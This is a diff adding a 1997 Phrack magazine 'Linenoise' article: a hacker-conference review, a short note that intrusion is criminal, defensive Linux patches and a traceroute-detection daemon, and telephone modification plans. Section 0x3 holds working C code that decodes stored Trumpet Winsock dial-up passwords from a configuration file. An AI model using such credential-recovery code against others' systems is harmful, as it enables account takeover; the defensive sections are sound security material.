@@ -1,0 +1,778 @@
+---[  Phrack Magazine   Volume 7, Issue 51 September 01, 1997, article 03 of 17
+
+
+-------------------------[  P H R A C K     5 1     L I N E N O I S E
+
+
+--------[  Various
+
+0x1>-------------------------------------------------------------------------
+ 
+                                A Review of H.I.P.
+
+                          <torquie@landslide.openix.com>
+
+
+Out of all of the cons I've been to (and I've been to loads), Hacking In
+Progress was definitely the coolest and the most surreal hacker con ever.
+This was definitely a European event though there were a few arrivals from the
+US.  The atmosphere was carnival.  It was like an old style con where you got
+together to meet up with people face to face, exchange ideas and basically
+have loads of fun.
+
+Around 2500 people attended: hackers, artists, media, police... a total mish -
+mash of cultures and ideas.
+
+HIP was a total geek-fest.  Computer networks were spread across the campsite.
+In the mornings (when I actually slept) I awoke to the chirping of birds and
+the booting up of windows95.  In the evenings I sat around the campfire
+chatting to mates while the hardcore's played DOOM and exchanged warez.
+
+During the day there were various activities.  One tent held lock-picking
+classes.  In another a group of astronomers had set up telescopes linked to
+computerized data-tracking equipment that you could print out.  The
+cypherpunks had their own tent set up and I snuck in occasionally for a chat
+and a cold drink.
+
+There was a videoconference link connected to HOPE but it crashed and was
+abandoned.  In the main marquee, there were lectures on the usual faire of
+hacker interests: computer security, the legalities of hacking, anonymous
+re-mailing, cryptography, etc.  The weather was boiling and my melted brain
+found it exceedingly difficult to concentrate.  Most of my time I spent
+outside in the shade or the tent housing the bar, talking to people
+individually or in small groups.
+
+The public telephones mysteriously malfunctioned on Sunday and could only be
+used to dial the emergency services.  However if you dialed the Dutch
+equivalent to 911 you got a dial tone, so you could dial anywhere in the world
+for free.  Supposedly this was a 'programming error' on the part of the Dutch
+Telephone Company.
+
+Smaller more interactive workshops were also held.  Though the technical
+lectures were really interesting, my favourite event was Padeluun's yo-yo
+workshop.  Besides the fact that I got to keep the yo-yo, the workshop itself
+was farcical performance art.  If you know the background you will understand
+what I mean, if not...  Padeluun is a member of the FOEBUD group from Germany.
+These people do some really brilliant projects and are very politically
+motivated.   One of their projects was to put up networks during the war in
+the former Yugoslavia.  They also work to distribute PGP to groups in
+countries with oppressive governments.  It is not just anyone who could pull
+off a workshop like this.  This was high irony.  When I walked up the workshop
+had already started and I came in on the line 'yo-yoing is good for social
+engineering, no one finds you a threat when you yo-yo'.  As the head of the
+Dutch Computer Crimes division was in attendance I thought this rather
+hilarious.
+
+The attitude at HIP was really positive.  The European definition of hacking
+has always been broader than the American definition.  Europeans accept the
+idea of 'social hacking'.  Not hacking in the Unix sense but in the sense of
+subverting technology, whether it be by pirate radio, hacking smartcards,
+social engineering the feds... or whatever.  Unlike some cons I've been to in
+the past couple of years, the atmosphere of HIP was really mature.  There
+weren't any young kids trashing anything, there weren't any stairwells to
+flood, no one set off any fire alarms or randomly destroyed anything through
+boredom, and generally the people who attended had a lot of respect for the
+event and the organisers.  Which means that no one I saw acted like a total
+wanker and no one is going to run the event out of town.
+
+On a personal note it was brilliant meeting people there and hearing of some of
+the most recent projects people had on the go.  Since the last time this event
+was held  (HEU, 'Hacking at the End of the Universe' held at the same spot in
+1993), the hacker scene has changed.
+
+One difference that struck me straight away was the fact that there were just
+as many females as males.  And these women weren't girlfriends or hacker ho's
+but women that are getting to grips with the technology and using it for
+various projects.
+
+Felipe Rodrigez who started Hack-tic along with Rop Gonggrip back in the early
+days of Holland's hacking scene, has always been active on the political front
+"For us, things have changed.  They used to call us criminals and think of us
+as terrorists.  Now we advise the Ministry of Justice.  We're the only ones
+who know the technology here."
+
+Rodrigez also believes that hacking is still a very useful tool in countries
+like Peru or Serbia where the state is unfair and citizens need to "defend
+themselves."  This view has made him unpopular with the secret services who
+consider the former Hack-tic more dangerous now that they have power in the
+business community in Holland.
+
+Though things may have changed since the early days of hacking, the European
+scene seems to have become something more grown up.  "The hacker scene is now
+pockets of culture.  There's alternative media, the old hacker culture, the
+Unix hackers, irc, even astronomers who are into their own computer culture.
+It's now for all of the people, which is why we call it Hacking in Progress,
+we have progressed"
+
+As a summation, HIP was fantastic.  It was brilliant to see most of the people
+I have known in the European scene in one place and to meet some new people
+who I will definitely keep in touch with the coming years.  I'm really looking
+forward to the next one!  If you want photos and other articles check out the
+HIP site at www.hip97.nl.
+
+
+0x2>-------------------------------------------------------------------------
+
+To: All it may concern
+
+	It has come to my attention, that people are forgetting what 
+hacking is.  I'm not speaking about the freedom of information, or the 
+pursuit of learning..  I'm talking about the fact that it is illegal and 
+against the law..  I hear left and right..  " So and So has been busted.. 
+lets protest..  Let's get the Hacker Defense Fund(TM) to help us! "
+
+Hey time to wake up..  YOU ARE A CRIMINAL IF YOU ARE COMPROMISING THE SECURITY 
+OF SITES/PHONE SYSTEMS/ETC..
+
+Not a rant, just a note that it's time to face up to your responsibilities.. 
+
+- Someone
+
+0x3>-------------------------------------------------------------------------
+    
+/*
+   TRUMPET WINSOCK PASSWORD HACKER by DOCTOR JEEP 11/96
+
+       erode@avana.bbs.comune.roma.it
+
+   written for Turbo C 2.0 (C) (old but cheap :) )
+
+   The author doesn't take any responsabilities for any proper/improper use of
+   this program.
+*/
+
+<++> winsock_passwd_hack.c
+#include <stdio.h>
+  unsigned char
+spazio[21]={88,75,55,47,114,66,87,92,35,68,69,87,101,38,122,123,45,117,74,78};
+  unsigned char name[34], fono[33], passc[33],riga[33],passd[23];
+  unsigned char user[11]="$username=", tele[9]="$number=",
+pass[11]="$password=";
+
+  FILE *f1;
+  int i,v,c,k;
+
+decodi (int ver) {
+  int ls,b;
+  if (ver==20) ls=10;
+  if (ver==21) ls=11;
+  b=strlen(passc);
+  for (i=ls;i<b;i++) {
+      v = passc[i];
+      v = v + 32 - spazio[i-ls];
+      if (v < 32) v = v + 96;
+      if (i-10<21) passd[i-ls] = v;
+  }
+}
+
+scrivi(int n, int st, unsigned char str[], char messaggi[])
+  {
+  c=strlen(str);
+  printf("%s",msg);
+  for(k=n;k<c-st;k++) {
+     printf("%c",str[k]);
+  }
+  printf("\n");
+
+}
+
+main (argc,argv)
+  int argc;
+  char *argv[];
+  {
+  printf("\n\nTrumpet Password Hacker by Doctor Jeep 96  NO (C)\n\n");
+  if(argc!=2) {
+    printf ("Specify the trumpet .ini file with his path \n");
+    exit(1);
+  }
+
+  f1=fopen(argv[1],"r");
+  if (f1==NULL) {
+      printf("\nUnable to open configuration file");
+      exit(1);
+  }
+
+  printf("\n");
+  while(!feof(f1))
+  {
+      fgets(riga,32,f1);
+      if (strspn(riga,pass)==10) strcpy(passc,riga);
+      if (strspn(riga,user)==10) strcpy(name,riga);
+      if (strspn(riga,tele)==8) strcpy(fono,riga);
+  }
+  fclose(f1);
+
+
+
+  scrivi (8,1,fono,"Server's Tel. #: ");
+  scrivi (10,1,name,"Username: ");
+  decodi (20);
+  scrivi (0,1,passd,"Trumpet 2.0 password: ");
+  decodi (21);
+  scrivi(0,3,passd,"Trumpet 2.1F password: ");
+}
+<-->
+
+/* END OF FILE by Doctor Jeep */
+
+
+0x4>-------------------------------------------------------------------------
+
+
+Tools for (paranoid ?) linux users 
+
+by whynot AKA baldor
+
+-> you need basic TCP/IP knowledge to understand this article <-
+
+Recently not only then number of attacks on big / commercial servers and
+machines with fast connections has increased, but even users with dial-in
+computers have been attacked or spied on.  A good example is the winnuke.c
+program that has been released on BugTraq and has been used excessively.
+Although these attacks are not as "threatening" as the attacks that are
+launched against big servers it can get really annoying if some idiot
+frequently tries to hack you / takes your machine down / delays you.
+
+Most Linux distributions have reacted to this development and made their
+telnet/ftp/whatever servers log every access. In this way you can easily put 
+annoying hosts into /etc/hosts.deny. But in my opinion there are (at least) 
+two things missing which I want to discuss in detail...
+
+1. Detecting traceroutes
+
+Traceroute is a really powerful command, which is often used to detect where 
+the computer that is being tracerouted is located and to which network it is
+connected.  Because of some simple reasons you can *not* simply make it 
+impossible for people to traceroute you, so the best you can do is detect *if* 
+someone traceroutes you, find out *who* tracerouted you and confuse him a bit.
+
+1.1 How does traceroute work ?
+
+Basically traceroute just sends out IP/UDP probe-packets to the specified host.
+To find out how the packet is routed (through which hosts it is going) 
+traceroute uses the TTL (time to live) field of the IP header. This TTL field
+specifies an upper limit of how many routers this packet can pass through 
+before it gets dropped.  Every router decreases the value of the field when 
+the packet in question arrives, until it becomes 0.  If this happens the
+router sends back an ICMP TIME_EXCEED to the sender of this packet (which is 
+the host that is tracerouting).
+
+So the strategy traceroute uses to trace the path of a packet is to send
+out packets to the target host putting an increasing value (starting with 1) 
+into the TTL field.  If a host reports ICMP TIME_EXCEED traceroute prints out 
+its address and the time that passed from the sending of the IP/UDP probe 
+packet until the receiving of the ICMP TIME_EXCEED.  After that it will 
+prepare a new probe packet with an IP TTL one greater then the previous packet.
+
+Traceroute will continue doing this until it receives an ICMP PORT_UNREACHABLE 
+packet from the target address, or the max hop count has been reached (defaults
+to 30).
+
+To understand this we should take a look at the UDP part of the packet we
+talked about above.  To detect somehow that it finally reached the target host 
+and should not try to go any further traceroute uses the connectionless UDP 
+protocol.  The UDP part of the probe-packet is addressed to a port which is 
+barley/never used (in nearly all Unix implementations 33434+ the TTL included 
+in the IP-Packet).  Since (normally) nothing is listening on port 33434 (and 
+above) the target host sends back an ICMP PORT_UNREACHABLE signal that tells 
+traceroute that it reached the target host and can stop sending any more 
+packets.
+
+Since the strategy of traceroute is a bit complex here is an (a bit simplified) 
+example. Let's say that you are host "source" and tracerouting your way to 
+host "target".
+
+    source:/root # traceroute target
+    traceroute to target (134.2.110.94), 30 hops max, 40 byte packets
+
+Now source sends out a probe packet to target (port 33434) with a TTL of
+1.  The packet is passing "some_host" and the router decreases the TTL of
+the packet.  It recognizes that the packet has "expired" (TTL=0) and sends
+back an ICMP TIME_EXCEED to source.  Now traceroute uses the information
+included in this packet to print out data about the first host the packets
+to target are passing:
+    
+    1  some_host (142.45.23.1) 2.456 ms
+
+Another probe packet is sent out by source, this time the TTL is 2 and the
+port is 33434+1 = 33435.  It gets back another ICMP TIME_EXCEED packet
+this time from another_host:
+
+    2  another_host (142.45.10.1)  3.983 ms 
+ 
+The third Probe has the TTL set to 3 and is addressed to port 33436. 
+Traceroute now gets back an ICMP PORT_UNREACHABLE from "target": 
+
+    3  target (142.45.10.13) 4.032 ms
+ 
+That's it ! Traceroute now finished its job and quits.
+
+    source:/root #
+    
+Please note that traceroute by default sends out three packets containing
+the same TTL (each packet to an increasing port number)  to determine the
+answering time of a host more accurately.  In reality, a traceroute output
+therefore looks like this:
+
+  traceroute to localhost (127.0.0.1), 30 hops max, 40 byte packets
+   1  localhost (127.0.0.1)  1.983 ms  1.304 ms  0.934 ms
+ 
+
+1.2 The strategy behind the traceroute-detector
+
+Knowing how traceroute works it is very easy to detect.  Simply set up
+sockets listen()ing to the ports 33434 and above and react if they receive
+any packets.  You can even try to guess how many hops the host that is
+tracerouting you is away by subtracting 33434 from the port-number you
+received the packet on and dividing the result by three.
+
+Listening to the port traceroute sends the probe-packet to also produces a
+funny effect: traceroute will neither get back an ICMP TIME_EXCEED nor
+an ICMP PORT_UNREACHABLE signal.  Therefore it will timeout waiting for the
+reply and put a * into your hosts entry.  Because of the timeout
+traceroute will *not* recognize that it already reached its target and
+continue sending probe-packets until the maximum number of hops is
+reached.
+
+With the little program detecttr running (and listening to ports 33434 -
+33434*30*3) a traceroute localhost looks like this: 
+
+   schnecke:/root # traceroute localhost
+   traceroute to localhost (127.0.0.1), 30 hops max, 40 byte packets
+     1  * * *
+     2  * * *
+     .
+     .
+     .
+     30 * * *
+   
+
+
+1.3 Problems detecting traceroutes
+
+The only problem with detecting traceroutes is that one might select
+another base-port number than the default or use another technique. 
+I have never seen any people doing this though.  So if just an average 
+idiot (or wannabe "hAx0r") is tracerouting you chances are really high 
+that you detect it.
+
+If you are *really* paranoid about traceroutes you should not use the
+ports to detect a trace but edit the file that deals with UDP packets.
+This /usr/src/linux/net/ipv4/udp.c
+
+(NOTE: this file is a part of the kernel. Recompile your kernel to make
+changes take effect) 
+
+Insert the line:
+
+printk(KERN_INFO "UDP: packet sent to unreachable port by %s !\n", 
+                                                  in_ntoa(daddr));
+
+before line 833: 
+
+ICMP_send(ski,ICMP_BEST_UNTEACH, ICMP_PORT_UNTEACH, 0, de);
+
+This will make the system log *all* requests to unreachable ports that are
+delivered through the UDP protocol.  Please note that the funny effect
+described in 1.2 will not occur (which can also be an advantage).
+
+BTW: Please be careful while editing the kernel - you need it :)
+
+1.4 Sample Implementation
+
+detecttr.c -> see the end of this file
+
+
+2. Detecting pings
+
+There has been a lot of discussion about ping in the last few months
+because it was often used to transmit oversized packets to other hosts
+resulting in crashes.  Although this bug has been fixed on most hosts
+already ping still is very popular to slow down people who are connected
+to the net through modem lines until they drop carrier themselves because
+of the BIG lag.
+
+You can *not* prevent people from pinging you (without having your ISP
+blocking all ICMP_ECHO requests to your host) and therefore causing
+traffic on your modem line.  But you can actually detect *who* pinged you,
+determine the ping-packet size and decide not to reply (this *may* reduce
+the data over your modem line up to factor 2).
+
+2.1 How does ping work and how do people slow down others by using ping ? 
+
+Simplified ping sends a packet containing an ICMP_ECHO and some data to the 
+target which will reply with an ICMP_ECHOREPLY packet that contains the data 
+sent to it (only some fields are modified).
+
+Normally ping will wait about 1 sec before it sends the next ICMP_ECHO.  On 
+many implementations of ping you can bypass this and do a "floodping" which 
+will *not* wait but just send the packets as fast as possible.  If you choose 
+a big packet size for the ping packet and you are pinging your victim from a 
+host with a fast connection (T1 or Ethernet) this will cause a lot of traffic 
+on your victims modem line and therefore slow him down to a halt. 
+
+2.2 How can I detect a ping and how do I prevent being flooded ?
+
+Since a ping is nothing more than a ICMP_ECHO with some data appended to it 
+you can simply intercept it, extract the senders address and the packet size 
+from it and decide whether you want to reply or not.  For non-floodpings you 
+can reduce the amount of data transferred over your modem line simply by 
+choosing not to reply.  But if someone is floodpinging you it does not help 
+much to not reply to the ping packets --> the incoming ping packets will 
+probably cause enough traffic to slow you down (unless the host where 
+floodpings come from is has a slow connection).  At least you can give it a 
+try anyway... 
+
+2.3 Sample implementation
+
+The handling of the ICMP_ECHO is done in the kernel. Edit your 
+/usr/src/linux/net/ipv4/icmp.c file and search for the section "Handle
+ICMP_ECHO".  These 16 lines of code are all you need to modify to defend 
+yourself against / detect ping-floods. 
+
+If you know a little C you can easily see that there exists a define
+"CONFIG_IP_IGNORE_ECHO_REQUESTS" which you can set to have the kernel just
+ignore all incoming ICMP ECHO_REQUESTs. But we want to be more selective.  We 
+want to log all pings that are sent to our machine. We do this by inserting 
+the line
+
+printk(KERN_INFO "ICMP: pinged by %s, packetsize = %d \n",in_ntoa(saddr),
+                                                    icmp_param.data_len);
+
+before the #endif.
+
+You can easily change the "Handle ICMP_ECHO" section so that your machine
+only replies to ICMP ECHO_REQUESTs that do not carry too much data and
+ignore the pings with big packet sizes: 
+
+<++> DTR/icmp.patch
+static void icmp_echo(struct icmphdr *icmph, struct sk_buff *skb, struct device *dev, __u32 saddr, __u32 daddr, int len)
+{
+#ifndef CONFIG_IP_IGNORE_ECHO_REQUESTS
+	struct icmp_bxm icmp_param;
+	if (len <= 1000) { /* we only reply to pings that do carry less than 1k data */
+		  icmp_param.icmph=*icmph;
+		  icmp_param.icmph.type=ICMP_ECHOREPLY;
+		  icmp_param.data_ptr=(icmph+1);
+		  icmp_param.data_len=len;
+		  if (ip_options_echo(&icmp_param.replyopts, NULL, daddr, saddr, skb)==0)
+		      icmp_build_xmit(&icmp_param, daddr, saddr, skb->ip_hdr->tos);
+		  printk(KERN_INFO "ICMP: pinged by %s, packetsize = %d \n", in_ntoa(saddr),icmp_param.data_len);
+	  }
+	else 
+		printk(KERN_INFO "ICMP: possible FLOOD DETECTED by %s, packetsize = %d \n", in_ntoa(saddr),len );
+#endif
+	kfree_skb(skb, FREE_READ);
+}
+<-->
+
+<++> DTR/detecttr.c 
+/*
+ * detecttr.c - by whynot AKA baldor (whynot@cyberjunkie.com)
+ * created: 08.05.97
+ * last modified: 11.07.97
+ * Platforms: Linux, FreeBSD should work with other POSIX-systems too.
+ *
+ * Compile:
+ * just the usual "gcc -o detecttr detecttr.c" for GNU C and 
+ * "cc -o detecttr detecttr.c" for other compilers...
+ * 
+ * Usage:
+ * Just run this program at the startup of your machine - it will stay in
+ * the background until someone traceroutes you. It only uses a *tiny* bit
+ * of your memory and nearly 0% CPU :)
+ * 
+ */
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <string.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/time.h>
+#include <sys/signal.h>
+#include <sys/syslog.h> /* simply comment this out if you don't have syslog.h */
+#include <netdb.h>
+
+
+#define MAXBUFLEN 200
+#define MYPORT 33435
+#define NUMPORTS 30*3
+
+int sockfd[NUMPORTS];
+
+
+void shutitdown()
+{
+
+	int w;
+	char buf[50];
+        for (w=0; w<NUMPORTS; w++)
+	    close(sockfd);
+        sprintf (buf,"DetectTraceroute terminated\n");
+	syslog(LOG_NOTICE , buf);
+	
+	exit(0);
+}
+
+char *getname (struct in_addr addr)
+{
+	struct hostent *h;
+	int w;
+	char foo[4];   /* the 4 numbers as ASCII-Values per char */
+	int tmpint[4]; /* used to convert from a string to 4 numbers */
+	char tmpbuf[20];
+	
+	sprintf(tmpbuf, "%s", inet_ntoa(addr));
+
+	if ( sscanf(tmpbuf,"%d.%d.%d.%d", &tmpint[0], &tmpint[1], &tmpint[2], &tmpint[3])  != 4) {
+		printf ("Error while detecting hostname !\n");
+		exit(1);
+	}
+
+	for(w=0; w<4; w++) foo[w]=tmpint[w];
+	
+	if ( (h=gethostbyaddr(foo, 4, AF_INET)) == NULL) {
+		herror("gethostbyaddr");
+		exit(1);
+		
+	}
+	return  h->h_name;
+}
+
+main(int argc, char *argv[])
+{
+	int hops;
+	struct sockaddr_in my_addr;
+	struct sockaddr_in remote_addr;
+	int addr_len, numbytes;
+	char buf[MAXBUFLEN];
+	int w;
+	fd_set readfds;
+	
+
+	if( fork() !=0 ) return(0); /* we don't want to use that annonying & */
+	
+	
+	signal(SIGHUP, SIG_IGN); /* ignore SIGHUP */
+	
+	signal(SIGTERM, shutitdown); /* clean shutdown */
+	
+	for(w=0; w<NUMPORTS; w++) {
+		
+		if ( (sockfd[w] = socket( AF_INET, SOCK_DGRAM, 0)) == -1) {
+			perror("socket");
+			exit(1);
+			
+		}
+		my_addr.sin_family = AF_INET;
+		my_addr.sin_port   = htons (MYPORT+w);
+		my_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+	
+		bzero(& (my_addr.sin_zero), 8);
+   
+		if ( bind (sockfd[w], (struct sockaddr *)&my_addr, sizeof (struct sockaddr) ) == -1) {
+			perror("bind");
+			exit(1);
+		}
+	}
+
+	FD_ZERO(&readfds);
+	for(w=0; w<NUMPORTS; w++)
+	    FD_SET(sockfd[w], &readfds);
+
+	
+        sprintf (buf,"DetectTraceroute successfully started\n");
+	syslog(LOG_NOTICE , buf);
+
+	while(1) {
+		select(sockfd[NUMPORTS-1]+1, &readfds, NULL, NULL, NULL);
+		
+		for (w=0; w < NUMPORTS; w++) {
+			if (FD_ISSET(sockfd[w], &readfds))
+			    hops = w;
+		}
+		
+		addr_len = sizeof(struct sockaddr);
+		
+		if ((numbytes=recvfrom(sockfd[hops], buf, MAXBUFLEN, 0, (struct sockaddr *)&remote_addr, &addr_len)) == -1) {
+			perror("recvfrom");
+			exit(1);
+		}
+		
+		/* we use buf for misc stuff  O:-) */
+		sprintf (buf,"TRACEROUTE from IP %s. Hostname: %s  HOPS: %d", inet_ntoa(remote_addr.sin_addr), getname(remote_addr.sin_addr), hops / 3 +1);
+		syslog(LOG_NOTICE , buf);
+		FD_ZERO(&readfds);                   
+		for(w=0; w<NUMPORTS; w++)
+		    FD_SET(sockfd[w], &readfds);
+		
+	}
+}
+<-->
+
+0x5>-------------------------------------------------------------------------
+
+      |  |||| |||||[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]
+|       | | ||| |||[ The Street Phreak's Phone Mods vol. 1 ]
+    | |  ||||||||||[               Jex {612}               ]
+      | | |||| || |[      <jex@teenworld.poboxes.com>      ]
+  |    ||  | ||||||[_______________________________________]
+
+[intr0]
+
+97.07.01
+
+  This project is a result of a need to have a more versatile phone for at 
+home and in the field.  Many "phone modification" files have been floating 
+around the scene for quite some time - some are incomplete, inaccurate, or 
+would be better taken advantage of if they were all integrated.  This project 
+should be a good starting point for making your phone elite.
+
+  The following modifications are divided into two primary parts:  The first
+being made to your phone directly, and the second being as a separate
+component.
+
+[part 1: m0d me]
+
+Teq:
+----
+2  1/8" mono jack (or stereo with tips tied)  274-274    2/$1.89  U1, U2
+2  SPDT slide switch                          275-409    2/$1.19  SW1, SW3
+1  100k single turn pot                       271-092      $1.29  R2
+1  Mini red LED                               276-026    2/$0.99  D1
+1  Hallmark Digital Greeting Card (optional)  (Hallmark) 1/$8-10  IC1
+1  6v power source                (optional)
+1  SPST normally closed momentary (optional)  275-1548   4/$2.89  SW2
+1  10k                            (optional)  271-1335   5/$0.49  R1
+
+
+  Since I'm cool, I'll give you a rough walk-through on the construction along
+with the schematic.  The phone modifications were kept to a minimum, since you
+most likely want the majority of your cute toys in the modular component.  I
+would like to make these devices modular as well at some point in the future 
+- if anybody would like to beat me to it, by all means.
+
+
+--[ring switch]----------------------------------------------------------------
+
+1. Desolder wire off one pad of the piezo element (ringer)
+2. Connect desoldered *pad* to right pole of SPDT
+3. Connect desoldered *wire* to center pole of SPDT
+4. Connect LED to left pole of SPDT
+5. Connect other side of LED to the pad of piezo element with the origional
+   wire
+
+(Note: You should now be able to select between an audible ring and the
+       flashing light.  If the LED does not light but the ringer works, switch
+       the wires going to the LED as the anode/cathode are not in the right
+       positions.)
+
+
+--[in jack]--------------------------------------------------------------------
+
+6. Desolder wire (-v, probably black) off one pad of the microphone
+7. Connect desoldered *wire* to center pole of SPDT
+8. Connect recently desoldered *pad* to right pole of SPDT
+9. Connect tip (or base) of U1 to left pole of SPDT
+10. Connect base (or tip) of U1 to the center pole of R2
+11. Connect side pole of R2 to the pad of the mic with the original wire
+
+(Note: You should now have the ability to switch between the audio jack and 
+       the mic.  This is necessary as the audio jack always drowns-out the mic,
+       even when it is doing something such as playing "UN-noise" while a tape
+       rewinds.  This also serves as a mute switch.)
+
+--[out jack]-------------------------------------------------------------------
+
+12. Connect U2 in parallel with the speaker.
+
+(Note: Out jack.)
+
+
+--[optional digital recorder]-------------------------------------------------
+
+13. Desolder mic from Hallmark card (IC1), it will not be used
+14. Connect desoldered mic wires to the base and tip of U2 in parallel
+    (isolated)
+15. Desolder speaker from IC1, it will not be used
+16. Desolder one speaker wire, it will not be used
+17. Connect the other speaker wire to R1
+18. Connect other side of R1 to the mic pad that has the original (v+) wire
+    and R2 connect to it
+19. Desolder "play switch" paying attention to how it is connected, it sucks
+20. Connect SW2 in it's place
+21. Connect v- (black wire) of 6v power source to SW2
+22. Connect v+ to IC1
+
+(Note: You should now be able to record from the mic and jack, and be able to
+       play it back into the phone.)
+
+
+[part 2: c0nstructi0n 0f p0w-paq]
+
+Teq:
+----
+8 DPDT slide switch                           275-403    2/$1.39  SW1, SW2,
+                                                                  SW3, SW6,
+                                                                  SW7, SW8,
+                                                                  SW9, SW12
+2 SPST slide switch                           275-401    2/$1.19  SW4, SW10
+2 DPST slide switch (substitute with 2 DPDT)  275-403    2/$1.39  SW5, SW11
+2 Dual polarity LED (phreakz discretion- 2                        LED1, LED3
+                     LEDs in parallel, or a
+                     2 pin Dual LED package)
+6 6P4C Modular Jack (try DigiKey, www.digikey.com)
+
+
+Parasitic Tap Detectors:
+------------------------
+2 15v Zener Diode      276-564   2/$0.99  D2, D4
+2 Mini Red LED         276-026   2/$0.99  LED2, LED4
+2 Bridge Rectifier     276-1161a 1/$0.99  D1, D3
+
+(Note: I substituted the 1N914/4148 Silicon Diode for the Zener and it seems to
+       work fine, 276-1122, 10/$1.19)
+
+
+  As you may of noticed, the Parasitic Tap Detectors are taken straight from
+the article Tap Alert in 2600 vol 13 iss 1, credit is given to No Comment and
+Crash Test Idiot.
+
+  Now, what all this is.  You have two primary inputs, and one master input in
+case you have a single connector with two lines on it.  There are two
+"outputs", whose function is up to you (these are optional).  Now you are left
+with one master output, whose function should be obvious.
+
+  SW1 & SW7 change between the "outer" and "inner" wires, in other words
+Red/Green vs. Black/Yellow.  SW2 & SW8 reverse polarity of the line (one is
+optional).  SW3 & SW9 serve as polarity detectors, lighting one color for a
+certain polarity and another color for the other polarity (one is optional).
+SW4 & SW10 make use of the tap detectors.  Most of the time you will not be
+using the tap detectors as they can have problems with the other devices on the
+line, experiment.  SW5 & SW11 are primary line power switches, make the line go
+off or on.  SW6 & SW12 are hold switches for each line, when they are both "off
+hold" you may conference the two lines.
+
+  The polarity changers are a must - often times store-bought telephone cables
+reverse voltage, and even your wall jack might have non-uniform polarities.  To
+use both lines at once, the polarity for each line must be the same, this can
+be achieved by throwing just one switch if they are reversed (it's an either/or
+state).
+
+  If you find any errors or corrections you would like to make, or you just
+need a shoulder to cry on, my email is listed above.  Any upd8s can be found at
+http://www.geocities.com/SiliconValley/Heights/1334, thanks for playing.
+
+
+[schematix]
+
+  The top of the diagram has the modifications to be made to the phone unit
+itself, the bottom to the modular device.
+
+----[  EOF
+
